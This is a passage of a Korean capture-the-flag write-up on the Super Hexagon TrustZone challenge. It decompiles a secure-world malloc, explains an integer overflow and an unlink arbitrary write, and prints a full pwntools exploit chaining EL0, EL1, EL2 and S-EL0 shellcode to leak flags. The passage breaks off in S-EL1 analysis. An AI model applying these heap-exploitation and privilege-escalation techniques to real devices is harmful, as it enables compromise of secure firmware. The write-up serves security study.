*)param_1-\u0026gt;data,(int *)param_1-\u0026gt;size); param_1-\u0026gt;cmd = 0; } } else { local_30 = s_assert(index_\u0026lt;_DB_NUM)_00002058._0_4_; uStack_2c = s_assert(index_\u0026lt;_DB_NUM)_00002058._4_4_; uStack_28 = s_assert(index_\u0026lt;_DB_NUM)_00002058._8_4_; uStack_24 = s_assert(index_\u0026lt;_DB_NUM)_00002058._12_4_; local_20 = s_assert(index_\u0026lt;_DB_NUM)_00002058._16_4_; uStack_1c = (undefined2)s_assert(index_\u0026lt;_DB_NUM)_00002058._20_4_; cStack_1a = SUB41(s_assert(index_\u0026lt;_DB_NUM)_00002058._20_4_,2); strcpy(param_1-\u0026gt;data,\u0026amp;local_30); param_1-\u0026gt;cmd = 1; } return; } uint32_t * malloc(uint sz) { chunk *iVar1; uint size; freed_chunk *FD; freed_chunk *BK; uint cur_sz; chunk *next_chunk; freed_chunk *iter_chunk; chunk *cur_chunk; uint32_t *cur_sz_addr; if ((int)is_heap_initialized \u0026lt; 0) { FUN_000012c2(); } cur_chunk = Arena.chunk_ptr; /* size normalization */ if (sz + 0x1f \u0026lt; 0x20) { size = 0x20; } else { size = sz + 0x1f \u0026amp; 0xfffffff0; } if (size \u0026lt; 0x40000) { for (iter_chunk = (Arena.freelist)-\u0026gt;fd; iter_chunk != Arena.freelist; iter_chunk = iter_chunk-\u0026gt;fd) { FD = iter_chunk-\u0026gt;fd; BK = (freed_chunk *)iter_chunk-\u0026gt;bk; cur_sz = iter_chunk-\u0026gt;size \u0026amp; 0xfffffffc; if (size \u0026lt;= cur_sz) { BK-\u0026gt;fd = FD; FD-\u0026gt;bk = (uint32_t)BK; *(uint *)((int)\u0026amp;iter_chunk-\u0026gt;size + cur_sz) = *(uint *)((int)\u0026amp;iter_chunk-\u0026gt;size + cur_sz) | 1; /* prev inuse bit set */ return \u0026amp;iter_chunk-\u0026gt;bk; } } cur_sz = (Arena.chunk_ptr)-\u0026gt;sz \u0026amp; 0xfffffffc; if (size + 0x20 \u0026lt;= cur_sz) { next_chunk = (chunk *)((int)\u0026amp;(Arena.chunk_ptr)-\u0026gt;fd_const0 + size); cur_sz_addr = \u0026amp;(Arena.chunk_ptr)-\u0026gt;sz; Arena.chunk_ptr = next_chunk; *cur_sz_addr = size | 1; next_chunk-\u0026gt;sz = cur_sz - size | 1; return \u0026amp;cur_chunk-\u0026gt;payload; } } else { size = size + 0xfff \u0026amp; 0xfffff000; iVar1 = (chunk *)software_interrupt_2(0,size,0,0,0xffffffff,0); if (iVar1 != (chunk *)0xffffffff) { iVar1-\u0026gt;sz = size | 2; return \u0026amp;iVar1-\u0026gt;payload; } } /* unlink */ return (uint32_t *)0x0; } interger overflow가 발생한다. aarch64 디버깅을 할 때 secure EL0를 직접적으로 디버깅은 불가능하지만 이렇게 간접적으로 메모리를 확인하는 것은 가능하다. 세 개의 청크를 할당한 모습이다. 취약점을 트리거하면 size가 너무 커져서 무조건 SIGSEGV가 나서 abort exception handler로 진입한다. 하지만 처음에 0xb에 대한 sighandler를 넘겨준적이 있다.\nvoid FUN_00001000(undefined4 param_1) { TCI *pTVar1; undefined4 *puVar2; undefined4 uVar3; undefined4 uStack_90; undefined4 uStack_8c; undefined4 uStack_88; undefined4 uStack_84; undefined4 uStack_80; undefined4 uStack_7c; undefined4 uStack_78; undefined4 uStack_74; undefined4 uStack_70; undefined4 uStack_6c; undefined4 uStack_68; undefined4 uStack_64; char cStack_60; uint uStack_5c; undefined2 *puStack_58; char *pcStack_54; undefined *puStack_50; undefined4 uStack_4c; undefined auStack_48 [4]; undefined4 uStack_44; undefined4 uStack_3c; undefined4 uStack_38; undefined4 uStack_34; undefined4 uStack_30; undefined4 uStack_2c; undefined4 uStack_28; undefined4 uStack_24; undefined4 uStack_20; undefined2 auStack_1c [2]; TCI *pTStack_18; TCI *pTStack_14; pTVar1 = tci_handle; pTStack_14 = tci_handle; uStack_3c = s_Secure_DB_access_failed_(SIGSEGV_00002000._0_4_; uStack_38 = s_Secure_DB_access_failed_(SIGSEGV_00002000._4_4_; uStack_34 = s_Secure_DB_access_failed_(SIGSEGV_00002000._8_4_; uStack_30 = s_Secure_DB_access_failed_(SIGSEGV_00002000._12_4_; uStack_2c = s_Secure_DB_access_failed_(SIGSEGV_00002000._16_4_; uStack_28 = s_Secure_DB_access_failed_(SIGSEGV_00002000._20_4_; uStack_24 = s_Secure_DB_access_failed_(SIGSEGV_00002000._24_4_; uStack_20 = s_Secure_DB_access_failed_(SIGSEGV_00002000._28_4_; auStack_1c[0] = (undefined2)s_Secure_DB_access_failed_(SIGSEGV_00002000._32_4_; pTStack_18 = tci_handle; tci_handle-\u0026gt;cmd = 1; uStack_44 = param_1; strcpy(pTVar1-\u0026gt;data,\u0026amp;uStack_3c); uVar3 = 0x104f; puVar2 = (undefined4 *)FUN_0000166c(0); pcStack_54 = s_Secure_DB_access_failed_(SIGSEGV_00002000 + 0x20; ... 다시 원래 context로 복원하여 계속 실행되는 특징이 있다. 전에 직접 제작한 secure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다. 다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.\n... FD = iter_chunk-\u0026gt;fd; BK = (freed_chunk *)iter_chunk-\u0026gt;bk; cur_sz = iter_chunk-\u0026gt;size \u0026amp; 0xfffffffc; if (size \u0026lt;= cur_sz) { BK-\u0026gt;fd = FD; FD-\u0026gt;bk = (uint32_t)BK; *(uint *)((int)\u0026amp;iter_chunk-\u0026gt;size + cur_sz) = *(uint *)((int)\u0026amp;iter_chunk-\u0026gt;size + cur_sz) | 1; /* prev inuse bit set */ return \u0026amp;iter_chunk-\u0026gt;bk; ... Arena.chunk_ptr을 변조하면 SEL0의 code segment에 대한 청크 할당이 가능해진다. 이를 이용해 SEL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.\n내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다. freelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 다음과 같이 메타데이터를 덮었다. 이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.\nexploit 전략은 다음과 같다.\nchunk 2 1 0 free. chunk 0 reclaim → heap overflow. chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text. size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 \u0026amp; 할당된 청크에 쉘 코드 작성. 시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력. 취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다. Exploit code (code execution \u0026amp; flag) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode # p = remote(\u0026#39;localhost\u0026#39;,6666) p = process(\u0026#39;./local_debug.sh\u0026#39;) # p = process(\u0026#39;./local_debug_secure.sh\u0026#39;) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) WORLD_SHARED_MEM_VA = 0x023fe000 WORLD_SHARED_MEM_PA = 0x40033000 TCI_Data_addr = 0x4010225c SEL0_shellcode = b\u0026#34;\\x00\\xf0\\x08\\xe8\u0026#34; # thumb switch SEL0_shellcode += b\u0026#39;A\u0026#39;*0x10 SEL0_shellcode += asm(\u0026#39;mov r0, sp\u0026#39;,arch=\u0026#39;arm\u0026#39;) SEL0_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mrc p15, 3, r1, c15, c12, 0 str r1, [r0] mrc p15, 3, r1, c15, c12, 1 str r1, [r0, #0x4] mrc p15, 3, r1, c15, c12, 2 str r1, [r0, #0x8] mrc p15, 3, r1, c15, c12, 3 str r1, [r0, #0xc] mrc p15, 3, r1, c15, c12, 4 str r1, [r0, #0x10] mrc p15, 3, r1, c15, c12, 5 str r1, [r0, #0x14] mrc p15, 3, r1, c15, c12, 6 str r1, [r0, #0x18] mrc p15, 3, r1, c15, c12, 7 str r1, [r0, #0x1c] mov r11, #{(WORLD_SHARED_MEM_VA \u0026gt;\u0026gt; 16)\u0026amp;0xffff} // SHARED MEM lsl r11, r11, #16 orr r11, r11, #{WORLD_SHARED_MEM_VA\u0026amp;0xffff} // SHARED MEM mov r0, #1 strb r0, [r11] add r11, r11, #0xc mov r9, #0 loop: add r0, sp, r9 add r1, r11, r9 ldrb r0, [r0] strb r0, [r1] add r9, r9, #1 cmp r9, #32 bne loop svc 0x0 \u0026#39;\u0026#39;\u0026#39;,arch=\u0026#39;arm\u0026#39;) SEL0_shellcode_src = 0x40035500 UART= 0x0000000009000000 read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185] TCI_Data = b\u0026#39;\u0026#39; TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b\u0026#39;A\u0026#39; * 0x18# chunk 1 TCI_Data += p32(0) + p32(0x31) + p32(0x00122c-0x10) + p32(0x0100060-0x8) + b\u0026#39;B\u0026#39; * 0x14 # chunk 2 EL2_shellcode = asm(f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((UART)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((UART)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((UART)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(UART)\u0026amp;0xffff}, lsl #0 mov x0, sp \u0026#39;\u0026#39;\u0026#39;) + bytes(read_flag) + asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x9, #0 loop: add x0, sp, x9 ldrb w0, [x0] strb w0, [x11] add x9, x9, #1 cmp x9, #32 bne loop movz x10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(WORLD_SHARED_MEM_VA)\u0026amp;0xffff}, lsl #0 movz x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x9, #{(WORLD_SHARED_MEM_PA)\u0026amp;0xffff}, lsl #0 movz x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x20, #{(SEL0_shellcode_src)\u0026amp;0xffff}, lsl #0 add x21, x9, #0xc // shellcode_dst, TCI buf payload mov x25, #0 alloc_loop: // alloc(i, 0x20, b\u0026#39;\u0026#39;) mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 add x25, x25, #1 cmp x25, #{3} bne alloc_loop mov x25, #2 free_loop: // free 2, 1, 0 mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x40, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 cmp x25, #{0} sub x25, x25, #1 bne free_loop //trigger the vuln mov w2, #3 str w2, [x9] // cmd mov w2, #0 str w2, [x9, #4] // idx movz w2, #0xffff, lsl 16 movk w2, #0xffff, lsl 0 str w2, [x9, #8] // sz movz x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x22, #{(TCI_Data_addr)\u0026amp;0xffff}, lsl #0 mov x8, #0x0 loop_tci: add x2, x21, x8 // dst add x1, x22, x8 // src ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(TCI_Data)} bne loop_tci movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // unlink AAW trigger mov w2, #3 str w2, [x9] // cmd mov w2, #4 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz w2, 0x0010, lsl #16 movk w2, 0x0050, lsl #0 str w2, [x9, #16] // data + 4 str w2, [x9, #20] // this is needed to get out of the freelist loop. movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // get .text mov w2, #3 str w2, [x9] // cmd mov w2, #5 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x0300, lsl 0 str w2, [x9, #8] // sz mov x8, #0x0 loop_copy: add x2, x21, x8 add x1, x20, x8 ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(SEL0_shellcode)} bne loop_copy movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 mov x8, #0x0 loop_print_flag_sel0: add x1, x21, x8 // dst ldrb w0, [x1] strb w0, [x11] add x8, x8, #1 cmp x8, #{0x20} bne loop_print_flag_sel0 \u0026#39;\u0026#39;\u0026#39;) EL2_shellcode += b\u0026#39;A\u0026#39; * (0x250- len(EL2_shellcode)) + TCI_Data EL2_shellcode = b\u0026#39;\\x41\u0026#39;*0xc+EL2_shellcode entry = 0xffffffffc001e000 + 0xf0 addr = 0xffffffffc00091b8 IPA = 0x2400 | (0b11\u0026lt;\u0026lt;6) # s2ap 11 DESC = 3 | 0x100000 EL2_TEXT = 0x00007ffeffffa000 entry_user = 0xffffffffc0028000 + 0xfd0 user_val = 0x2403 | 64 | 0x0020000000000000# ap 01 EL2_shellcode_addr = 0x7ffeffffc100 EL1_shellcode = asm(f\u0026#39;nop\u0026#39;)*(0x400//4) EL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x0, #1 movz x1, #{((IPA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x1, #{((IPA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x1, #{((IPA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x1, #{(IPA)\u0026amp;0xffff}, lsl #0 movz x2, #{((DESC)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x2, #{((DESC)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x2, #{((DESC)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x2, #{(DESC)\u0026amp;0xffff}, lsl #0 hvc #0x1337 // PA 0x0000000040102000 RWX movz x11, #{((entry_user)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry_user)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry_user)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry_user)\u0026amp;0xffff}, lsl #0 movz x10, #{((user_val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((user_val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((user_val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(user_val)\u0026amp;0xffff}, lsl #0 str x10, [x11] // IPA 0x0000000000002000 RW movz x11, #{((EL2_TEXT)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(EL2_TEXT)\u0026amp;0xffff}, lsl #0 movz x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x12, #{(EL2_shellcode_addr)\u0026amp;0xffff}, lsl #0 mov x9, #0x0 loop: add x2, x11, x9 add x1, x12, x9 ldrb w0, [x1] strb w0, [x2] add w9, w9, #1 cmp x9, #{len(EL2_shellcode)} bne loop hvc #0x1337 // trigger!!! \u0026#39;\u0026#39;\u0026#39;) cnt = len(EL1_shellcode) val = 0x0040000000036483 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 // IPA 0x36000 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 // r-x mov x8, #0xe2 svc #0x1337 mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 // IPA 0x37000 movz x11, #{((entry)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x8, #0x3f mov x2, #1 svc #0x1337 // now we can modify the kernel page table movz x10, #{((val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(val)\u0026amp;0xffff}, lsl #0 sub x11, x11, #0xa0 str x10, [x11] mov x8, #0x123 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x100 - len(payload)) payload += EL2_shellcode assert len(payload) \u0026lt;= 0x500 payload += b\u0026#39;\\x41\u0026#39; * (0x500 - len(payload)) payload += SEL0_shellcode payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(EL1_shellcode) sleep(0.1) pause() p.send(b\u0026#39;\\x43\u0026#39;) # AP 01 -\u0026gt; EL0 RW EL1 RW sleep(0.1) p.interactive() S-EL1, Secure kernel 이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다. 실질적으로 Secure world는 EL0\u0026amp;1 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다. S-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.\nvoid FUN_0800087c(void) { undefined4 local_c; switch(ctx.r0) { case 0x83000003: local_c = FUN_08000724(ctx.r1,ctx.r2); break; case 0x83000004: local_c = FUN_08000790(ctx.r1,ctx.r2); break; case 0x83000005: local_c = FUN_080007ea(ctx.r1,ctx.r2); break; case 0x83000006: local_c = FUN_0800083e(ctx.r1); break; default: local_c = 0xffffffff; } secure_monitor_call(0x83000007,local_c); return; } 먼저 EL2에서 S-EL3를 거쳐 S-EL1까지 도달할 경우 위 핸들러를 만나게 된다.\n0x83000006은 S-EL0까지 내려가는 케이스이니 이를 제외하고 분석하면 된다.\nint FUN_08000724(uint r1,uint r2) { int iVar1; int iVar2; if ((((r2 == 0) || ((r2 \u0026amp; 0xfff) != 0)) || ((r1 \u0026amp; 0xfff) != 0)) || (((r1 \u0026lt; 0x40000000 || (iVar1 = FUN_0800054a(r2), iVar1 == -1)) || (iVar2 = FUN_080003da(iVar1,r1,r2,2), iVar2 == -1)))) { iVar1 = -1; } return iVar1; } Secure physical address에 대한 접근은 제한된다. 그런데 약간의 문제가 발생할 여지가 있다. 권한 설정에 문제가 존재한다.\nundefined4 FUN_080004c2(uint VA,int sz) { int iVar1; uint uVar2; uint uVar3; int cnt; uint va; int local_c; cnt = sz; va = VA; /* VA can be duplicated */ do { if (cnt \u0026lt; 1) { return 1; } uVar2 = va \u0026gt;\u0026gt; 0x15 \u0026amp; 0x7f; uVar3 = va \u0026gt;\u0026gt; 0xc \u0026amp; 0x1ff; iVar1 = uVar2 * 8; if ((*(uint *)(\u0026amp;trans_table_lvl1 + iVar1) | *(uint *)(iVar1 + 0x8004004)) == 0) { local_c = (uVar3 + 1) * 0x1000; } else { iVar1 = (uVar3 + uVar2 * 0x200) * 8; if ((*(uint *)(\u0026amp;trans_table_lvl2 + iVar1) | *(uint *)(iVar1 + 0x8005004)) != 0) { return 0; } local_c = 0x1000; } va = local_c + va; cnt = cnt - local_c; } while( true ); } 이해를 못했던 라인이 있었었는데 tans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.\nundefined4 FUN_080003da(int param_1,int phys,int sz,undefined4 prop) { int iVar1; int size; int phys_addr; int VA; size = sz; phys_addr = phys; VA = param_1; while( true ) { if (size == 0) { return 0; } iVar1 = FUN_080001e8(VA,phys_addr,prop); if (iVar1 == -1) break; VA = VA + 0x1000; phys_addr = phys_addr + 0x1000; size = size + -0x1000; } return 0xffffffff; } 분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다. FUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다. integer overflow 버그가 존재한다.\n+static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; MMIO로 FLASH가 0x0 번지 쪽에 있다는 것을 알 수 있는데, 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없다. write를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다. 악용할 수 없는 취약점이다.\nundefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3) { uint uVar1; int iVar2; uint uVar3; uint local_30; uint uStack_2c; local_30 = 0x60f; if ((param_3 \u0026amp; 2) != 0) { local_30 = 0x64f; } if ((param_3 \u0026amp; 1) != 0) { local_30 = local_30 | 0x80; } uStack_2c = 0; if ((param_3 \u0026amp; 4) != 0) { uStack_2c = 0x400000; } if ((param_3 \u0026amp; 8) != 0) { uStack_2c = uStack_2c | 0x200000; } if ((param_3 \u0026amp; 0x10) != 0) { local_30 = local_30 | 0x20; } uVar3 = addr \u0026gt;\u0026gt; 0x15 \u0026amp; 0x7f; if ((*(uint *)(\u0026amp;trans_table_lvl1 + uVar3 * 8) | *(uint *)(uVar3 * 8 + 0x8004004)) == 0) { uVar1 = FUN_0800019c(\u0026amp;trans_table_lvl2 + uVar3 * 0x1000); *(uint *)(\u0026amp;trans_table_lvl1 + uVar3 * 8) = uVar1 | 3; FUN_08001944(\u0026amp;trans_table_lvl2 + uVar3 * 0x1000,0,0x1000); } iVar2 = ((addr \u0026gt;\u0026gt; 0xc \u0026amp; 0x1ff) + uVar3 * 0x200) * 8; *(uint *)(\u0026amp;trans_table_lvl2 + iVar2) = local_30 | phys_addr; *(uint *)(iVar2 + 0x8005004) = uStack_2c; return 0; } 내부적으로 walk해서 다음과 같이 할당한다. 이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.\nvoid FUN_080006ba(int phys) { uint uVar1; uVar1 = phys - secure_phys_max \u0026gt;\u0026gt; 17; if (uVar1 \u0026lt; 0x20) { v0[uVar1] = v0[uVar1] | 1 \u0026lt;\u0026lt; (0x1f - (phys - secure_phys_max \u0026gt;\u0026gt; 12 \u0026amp; 0b00011111) \u0026amp; 0xff); } return; } 2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다. 그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.\nundefined4 FUN_080007ea(uint r1,uint r2) { undefined4 uVar1; if (((((r1 \u0026amp; 0xfff) == 0) \u0026amp;\u0026amp; (0x1ffffff \u0026lt; r1)) \u0026amp;\u0026amp; (r1 \u0026lt; 0x2400000)) \u0026amp;\u0026amp; ((r2 != 0 \u0026amp;\u0026amp; (r2 \u0026lt;= 0x2400000 - r1)))) { uVar1 = FUN_08000c38((char *)r1,r2); } else { uVar1 = 0xffffffff; } return uVar1; } undefined4 FUN_08000c38(char *param_1,undefined4 param_2) { int iVar1; int iVar2; int iVar3; int iVar4; int sz; iVar1 = verify(param_1,param_2); if (iVar1 != 0) { iVar4 = *(int *)(param_1 + 0x10); sz = ((*(int *)(param_1 + 0x10) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000; iVar1 = alloca(*(int *)(param_1 + 0xc),sz,10); if ((((iVar1 != -1) \u0026amp;\u0026amp; ((iVar1 = ((*(int *)(param_1 + 0x18) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000, *(int *)(param_1 + 0x18) == 0 || (iVar2 = alloca(*(int *)(param_1 + 0x14),iVar1,0xe), iVar2 != -1)))) \u0026amp;\u0026amp; ((iVar2 = ((*(int *)(param_1 + 0x20) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000, *(int *)(param_1 + 0x20) == 0 || (iVar3 = alloca(*(int *)(param_1 + 0x1c),iVar2,0xe), iVar3 != -1)))) \u0026amp;\u0026amp; (iVar3 = alloca(0xff8000,0x8000,0xe), iVar3 != -1)) { FUN_08001944(*(undefined4 *)(param_1 + 0xc),0,sz); FUN_08001906(*(undefined4 *)(param_1 + 0xc),param_1 + 0x24,*(undefined4 *)(param_1 + 0x10)); if (*(int *)(param_1 + 0x18) != 0) { FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1); FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24, *(undefined4 *)(param_1 + 